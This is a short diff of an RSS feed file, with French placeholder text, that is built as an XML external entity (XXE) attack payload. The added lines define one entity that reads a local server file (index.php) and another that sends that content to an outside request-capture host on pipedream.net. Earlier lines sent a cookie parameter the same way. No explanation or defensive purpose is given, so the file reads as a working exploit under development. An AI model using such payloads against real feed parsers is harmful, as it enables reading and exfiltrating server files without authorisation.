@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "test1234">
-  <!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?cookie=&xxe;">
+  <!ENTITY xxe SYSTEM "file://index.php">
+  <!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?data=&xxe;">
 ]>
 <rss version="2.0">
   <channel>
@@ -9,7 +9,7 @@
     <link>http://example.com/</link>
     <description>Ceci est un flux de test.</description>
     <item>
-      <title>&xxe;</title>
+      <title>Contenu sensible</title>
       <link>http://example.com/article1</link>
       <description>Contenu de l'article 1</description>
       <pubDate>Mon, 21 Jul 2025 12:00:00 +0200</pubDate>
